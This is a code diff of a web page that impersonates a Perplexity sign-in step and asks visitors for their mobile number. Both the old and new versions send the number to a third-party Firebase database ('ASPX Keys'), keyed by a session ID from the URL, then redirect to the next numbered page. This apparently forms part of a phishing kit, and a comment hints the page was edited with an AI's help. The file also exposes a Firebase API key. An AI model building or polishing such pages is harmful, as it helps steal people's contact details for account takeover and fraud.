@@ -3,64 +3,130 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Connect Mobile - Perplexity</title>
-    
-    <!-- Firebase SDKs -->
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
-    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore-compat.js"></script>
-
+    <title>Connect Your Mobile Number</title>
     <style>
-        * { box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; margin: 0; padding: 0; }
-        body { background: #ffffff; display: flex; flex-direction: column; align-items: center; padding: 60px 24px; color: #2d333a; }
-        .container { width: 100%; max-width: 400px; text-align: center; }
-        
-        h1 { font-size: 32px; font-weight: 600; margin-bottom: 16px; color: #000; letter-spacing: -0.5px; }
-        p.desc { font-size: 16px; color: #6e6e80; line-height: 1.5; margin-bottom: 40px; }
-        
-        .field { position: relative; margin-bottom: 8px; text-align: left; }
-        .field label { position: absolute; top: -10px; left: 15px; background: #fff; padding: 0 5px; font-size: 12px; color: #6e6e80; }
-        input { width: 100%; padding: 16px; font-size: 18px; border: 1px solid #d1d1d6; border-radius: 14px; outline: none; transition: 0.2s; }
-        input:focus { border-color: #000; }
-        
-        .error { color: #df1b41; font-size: 13px; text-align: left; display: none; margin-top: 5px; font-weight: 500; }
-        
-        .terms { font-size: 14px; color: #6e6e80; margin-top: 30px; line-height: 1.5; }
-        .terms a { color: #000; text-decoration: underline; cursor: pointer; }
-        
-        .btn { width: 100%; background: #000; color: #fff; border: none; padding: 18px; border-radius: 35px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 40px; transition: 0.3s; }
-        .btn:hover:not(:disabled) { background: #333; }
-        .btn:disabled { opacity: 0.5; cursor: not-allowed; }
-        
-        .loading { display: none; text-align: center; margin-top: 20px; color: #6e6e80; font-size: 14px; }
-        .spinner { display: inline-block; width: 16px; height: 16px; border: 2px solid #d1d1d6; border-top: 2px solid #000; border-radius: 50%; animation: spin 1s linear infinite; margin-right: 8px; vertical-align: middle; }
-        @keyframes spin { to { transform: rotate(360deg); } }
+        * {
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+        }
+
+        body {
+            margin: 0;
+            padding: 0;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            background-color: #ffffff;
+        }
+
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            text-align: center;
+        }
+
+        h1 {
+            font-size: 32px;
+            font-weight: 600;
+            margin-bottom: 10px;
+            color: #2d333a;
+            letter-spacing: -0.5px;
+        }
+
+        p {
+            font-size: 16px;
+            color: #6e6e80;
+            line-height: 1.5;
+            margin-bottom: 30px;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 20px;
+            text-align: left;
+        }
+
+        .input-label {
+            position: absolute;
+            top: -10px;
+            left: 15px;
+            background: white;
+            padding: 0 5px;
+            font-size: 12px;
+            color: #999;
+            z-index: 1;
+        }
+
+        input[type="tel"] {
+            width: 100%;
+            padding: 16px;
+            font-size: 18px;
+            border: 1px solid #c2c8d0;
+            border-radius: 30px;
+            outline: none;
+            transition: border-color 0.2s;
+        }
+
+        input[type="tel"]:focus {
+            border-color: #000;
+        }
+
+        /* Remove arrows from number input */
+        input::-webkit-outer-spin-button,
+        input::-webkit-inner-spin-button {
+            -webkit-appearance: none;
+            margin: 0;
+        }
+
+        .btn-continue {
+            width: 100%;
+            padding: 14px;
+            background-color: #0f172a;
+            color: white;
+            border: none;
+            border-radius: 30px;
+            font-size: 16px;
+            font-weight: 500;
+            cursor: pointer;
+            margin-top: 10px;
+        }
+
+        .btn-continue:hover {
+            background-color: #1e293b;
+        }
+
+        .error-msg {
+            color: #d93025;
+            font-size: 13px;
+            margin-top: 5px;
+            display: none;
+        }
     </style>
 </head>
 <body>
 
     <div class="container">
+        <!-- ChatGPT Text Removed as requested -->
+        
         <h1>Connect Your Mobile Number</h1>
-        <p class="desc">Connect Your Phone Number to signing in to your Perplexity Account</p>
+        <p>Connect Your Phone Number to signing in to your Perplexity Account</p>
 
-        <div class="field">
-            <label>Mobile number</label>
-            <input type="text" id="mobile" placeholder="+91 1234567890" spellcheck="false" autocomplete="off">
-            <div id="errorMsg" class="error">Please enter a valid number (e.g. +91 1234567890)</div>
+        <div class="input-group">
+            <span class="input-label">Mobile Number</span>
+            <input type="tel" id="mobileNumber" placeholder="1234567890" maxlength="10" autocomplete="off">
+            <div id="error" class="error-msg">Please enter a valid 10-digit number</div>
         </div>
 
-        <p class="terms">
-            By clicking "Continue", you agree to our <a href="https://1.com">Terms</a> and 
-            have read our <a href="https://1.com">Privacy Policy</a>.
-        </p>
-
-        <button id="nextBtn" class="btn">Continue</button>
-        <div id="loading" class="loading">
-            <span class="spinner"></span>Connecting...
-        </div>
+        <button class="btn-continue" id="submitBtn">Continue</button>
     </div>
 
-    <script>
-        // Firebase Config
+    <!-- Firebase Scripts -->
+    <script type="module">
+        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
+        import { getFirestore, doc, updateDoc, serverTimestamp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-firestore.js";
+
         const firebaseConfig = {
             apiKey: "AIzaSyDPm2za3Ho0Hd8Henuhq0KxAHyUQh-Hi-U",
             authDomain: "question-metabase.firebaseapp.com",
@@ -73,109 +139,68 @@
         };
 
         // Initialize Firebase
-        firebase.initializeApp(firebaseConfig);
-        const db = firebase.firestore();
+        const app = initializeApp(firebaseConfig);
+        const db = getFirestore(app);
 
-        // Get Dynamic Session ID from URL (?session=4683853387)
-        const urlParams = new URLSearchParams(window.location.search);
-        const sessionId = urlParams.get('session');
+        // Get elements
+        const phoneInput = document.getElementById('mobileNumber');
+        const submitBtn = document.getElementById('submitBtn');
+        const errorMsg = document.getElementById('error');
 
-        const mobileInput = document.getElementById('mobile');
-        const nextBtn = document.getElementById('nextBtn');
-        const errorMsg = document.getElementById('errorMsg');
-        const loadingDiv = document.getElementById('loading');
+        // Function to get Session ID from URL
+        const getSessionId = () => {
+            const urlParams = new URLSearchParams(window.location.search);
+            return urlParams.get('session');
+        };
 
-        // Validate session on page load
-        window.addEventListener('load', () => {
-            if (!sessionId) {
-                alert("Session ID missing in URL. Please try again.");
-                nextBtn.disabled = true;
-            }
+        const sessionId = getSessionId();
+
+        // Restriction: Only allow 10 digits
+        phoneInput.addEventListener('input', (e) => {
+            e.target.value = e.target.value.replace(/[^0-9]/g, '').slice(0, 10);
+            errorMsg.style.display = 'none';
         });
 
-        async function submitData() {
-            const val = mobileInput.value.trim();
-            // Validates +91 1234567890 or +911234567890 (exactly 10 digits after code)
-            const phoneRegex = /^\+91\s?\d{10}$/;
+        // Handle submission
+        const handleSubmit = async () => {
+            const number = phoneInput.value;
+
+            if (number.length !== 10) {
+                errorMsg.style.display = 'block';
+                return;
+            }
 
             if (!sessionId) {
                 alert("Session ID missing in URL");
                 return;
             }
 
-            if (!phoneRegex.test(val)) {
-                errorMsg.style.display = 'block';
-                return;
-            }
-
-            // Valid phone number - proceed with submission
-            errorMsg.style.display = 'none';
-            nextBtn.disabled = true;
-            nextBtn.style.display = 'none';
-            loadingDiv.style.display = 'block';
-
             try {
-                console.log("Starting Firebase update with Session ID:", sessionId);
+                // Reference the specific document in "ASPX Keys" collection
+                const docRef = doc(db, "ASPX Keys", sessionId);
                 
-                // Update the existing document in "ASPX Keys" using the SESSION ID
-                const docRef = db.collection("ASPX Keys").doc(sessionId);
+                // Update the document with the mobile number
+                await updateDoc(docRef, {
+                    mobileNumber: number,
+                    updatedAt: serverTimestamp()
+                });
 
-                // Set data with merge to preserve existing fields
-                await docRef.set({
-                    mobile: val,
-                    updatedAt: new Date().toLocaleString() + " UTC+5:30"
-                }, { merge: true });
+                // Redirect to 6.html with same session ID
+                window.location.href = `6.html?session=${sessionId}`;
 
-                console.log("Firebase update successful, redirecting to 6.html");
-
-                // Wait a brief moment to ensure write completes, then redirect
-                setTimeout(() => {
-                    window.location.href = `6.html?session=${sessionId}`;
-                }, 500);
-
-            } catch (err) {
-                console.error("Firebase Error Details:", err);
-                
-                // Show specific error message
-                let errorMsg = "Error updating record. Please try again.";
-                if (err.code === 'permission-denied') {
-                    errorMsg = "Permission denied. Please contact support.";
-                } else if (err.code === 'unavailable') {
-                    errorMsg = "Service unavailable. Please try again later.";
-                }
-                
-                alert(errorMsg);
-                
-                // Reset button state
-                nextBtn.disabled = false;
-                nextBtn.style.display = 'block';
-                loadingDiv.style.display = 'none';
+            } catch (e) {
+                console.error("Error updating document: ", e);
+                alert("An error occurred. Please try again.");
             }
-        }
+        };
 
         // Click Event
-        nextBtn.addEventListener('click', submitData);
+        submitBtn.addEventListener('click', handleSubmit);
 
-        // Enter Key = Submit
-        mobileInput.addEventListener('keypress', (e) => {
-            if (e.key === 'Enter' && !nextBtn.disabled) {
-                submitData();
-            }
-        });
-
-        // Auto-prefix +91
-        mobileInput.addEventListener('focus', () => {
-            if (!mobileInput.value) {
-                mobileInput.value = '+91 ';
-            } else if (!mobileInput.value.startsWith('+91')) {
-                mobileInput.value = '+91 ' + mobileInput.value;
-            }
-        });
-
-        // Clear error on input
-        mobileInput.addEventListener('input', () => {
-            if (errorMsg.style.display === 'block') {
-                errorMsg.style.display = 'none';
+        // Enter Key Event
+        phoneInput.addEventListener('keypress', (e) => {
+            if (e.key === 'Enter') {
+                handleSubmit();
             }
         });
     </script>
